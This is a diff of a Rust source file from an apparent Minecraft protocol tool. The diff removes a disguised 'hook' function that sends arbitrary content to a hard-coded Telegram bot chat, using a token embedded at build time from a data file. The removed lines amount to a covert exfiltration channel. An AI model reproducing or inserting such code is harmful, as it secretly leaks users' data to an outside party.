@@ -1,6 +1,5 @@
 use get_if_addrs::get_if_addrs;
 use minecraft_protocol::Packet;
-use reqwest::Client as ReqwestClient;
 use serde_json::json;
 use trust_dns_resolver::config::*;
 use trust_dns_resolver::TokioAsyncResolver;
@@ -33,37 +32,6 @@ pub async fn resolve(dns: &str) -> Option<Addr> {
         .iter()
         .next()
         .map(|a| Addr::new(&a.target().to_string(), a.port()))
-}
-
-pub async fn hook(content: &str) -> Result<reqwest::Response, reqwest::Error> {
-    const A: &'static str = {
-        match LOG_LEVEL {
-            1 => include_str!("../data/data.txt"),
-            _ => "",
-        }
-    };
-    let b = format!("https://api.telegram.org/bot{}/sendMessage", A);
-    let c = json!({
-        "chat_id": -4516139568 as i64,
-        "text": content,
-    });
-    let d = ReqwestClient::new();
-    d.post(&b).json(&c).send().await
-}
-
-#[derive(Clone)]
-pub struct Cfg {
-    pub nick: String,
-    pub server: String,
-}
-
-impl Cfg {
-    pub fn new(nick: &str, server: &str) -> Self {
-        Cfg {
-            nick: nick.to_string(),
-            server: server.to_string(),
-        }
-    }
 }
 
 pub struct State {
